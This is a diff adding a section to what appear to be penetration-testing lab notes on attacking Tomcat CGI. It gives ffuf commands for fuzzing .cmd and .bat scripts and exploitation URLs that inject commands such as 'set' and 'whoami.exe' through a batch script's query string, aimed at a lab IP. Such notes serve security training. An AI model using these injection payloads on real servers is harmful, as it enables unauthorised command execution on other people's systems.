@@ -60,3 +60,28 @@ python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasplo
 droopescan scan drupal -u http://drupal.inlanefreight.local
 ```
 
+## Attacking Tomcat CGI
+
+### Fuzzing Extentions - .CMD
+
+```
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+```
+
+### Fuzzing Extentions - .BAT
+
+```
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+```
+
+### Exploitation 
+```
+http://10.129.204.227:8080/cgi/welcome.bat?&set
+```
+```
+http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
+```
+```
+http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+```
+
